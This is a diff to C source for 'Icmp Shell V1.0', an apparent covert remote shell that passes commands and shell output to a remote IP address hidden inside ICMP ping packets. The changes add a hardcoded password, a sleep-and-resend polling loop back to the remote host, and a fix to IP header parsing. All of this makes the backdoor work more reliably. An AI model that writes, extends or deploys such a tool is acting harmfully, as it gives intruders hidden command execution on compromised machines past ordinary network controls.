@@ -53,6 +53,7 @@ typedef unsigned char uint8;
 
 #define IN_BUF_SIZE   1024  //接收数据的缓冲区的大小 
 #define OUT_BUF_SIZE  64
+#define SLEEP_TIME 1000
 
 int  g_icmp_sock = 0;
 int  g_CanThreadExit = 0; //线程是不是可以退出了。
@@ -62,8 +63,24 @@ char *g_MyName = NULL;
 uint32 g_RemoteIp = 0;// 远程 ip 
 char *g_Cmd = NULL; //要执行的命令
 char *g_Request = NULL;//请求的数据吧
-
+char *g_password = "sincoder"; //通信的密码
 char *g_hello_msg = "Icmp Shell V1.0 \nBy: sincoder \n";
+
+
+void MySleep(uint32 msec)
+{
+    struct timespec slptm;
+    slptm.tv_sec = msec / 1000;
+    slptm.tv_nsec = 1000 * 1000 * (msec - (msec / 1000) * 1000);      //1000 ns = 1 us
+    if(nanosleep(&slptm,NULL) != -1)
+    {
+
+    }
+    else
+    {
+        dbg_msg("%s : %u","nanosleep failed !!\n",msec);
+    }
+}
 
 /*
  from tcpdump  not thread safe
@@ -204,6 +221,8 @@ void *Icmp_RecvThread(void *lparam)
     char *data;
     int nbytes = 0;
 
+    dbg_msg("%s:Icmp_RecvThread  start !! \n",__func__);
+
     while(1) 
     {
         // read data from socket
@@ -215,8 +234,9 @@ void *Icmp_RecvThread(void *lparam)
             ip = (struct iphdr *) in_buf;
             if (nbytes > sizeof(struct iphdr))
             {
+                int iplen = ip->ihl * sizeof(unsigned int);
                 nbytes -= sizeof(struct iphdr);
-                icmp = (struct icmphdr *) (ip + 1);
+                icmp = (struct icmphdr *) ((char *)ip + iplen);
                 if(0 == icmp->type)  //只接受 icmp request 请求的
                 {
                     if (nbytes > sizeof(struct icmphdr))
@@ -237,6 +257,9 @@ void *Icmp_RecvThread(void *lparam)
                                 fflush(stdout);
 
                                 //我们也要马上 发回一个 request 来看看 有木有数据了 此时要延时的 
+                                MySleep(SLEEP_TIME);
+
+                                icmp_sendrequest(g_icmp_sock,ip->saddr,NULL,0);
                             }
                         }
                     }
@@ -245,9 +268,8 @@ void *Icmp_RecvThread(void *lparam)
                 {
                     //icmp request 
                     //此时 发送 hello msg
-                    uint32 srcip = htonl(ip->saddr);
-                    dbg_msg("%s: recv a icmp request from %s \n",__func__,iptos(srcip));
-                    icmp_sendrequest(g_icmp_sock,srcip,(uint8 *)g_hello_msg,strlen(g_hello_msg)); //
+                    dbg_msg("%s: recv a icmp request from %s \n",__func__,iptos(ip->saddr));
+                    icmp_sendrequest(g_icmp_sock,ip->saddr,(uint8 *)g_hello_msg,strlen(g_hello_msg)); //
                 }
             }
         }
@@ -269,6 +291,8 @@ void *ShellPipe_ReadThread(void *lparam)
 {
     unsigned char buff[512];
     int nBytes = 0;
+
+    dbg_msg("%s:ShellPipe_ReadThread  start ...\n",__func__);
     while((nBytes = read(read_pipe[0],&buff[0],510)) > 0)
     {
         dbg_msg("%s: recv %d bytes from pipe: %s \n",__func__,nBytes,buff);
@@ -277,6 +301,15 @@ void *ShellPipe_ReadThread(void *lparam)
     dbg_msg("%s: thread exit ... \n",__func__);
     return NULL;
 }
+
+// void *Timer_thread(void *lparam)
+// {
+//     while (MySleep(SLEEP_TIME))
+//     {
+//         icmp_sendrequest(g_icmp_sock,)
+//     }
+// }
+ 
 
 /*
 退出的时候重新启动进程
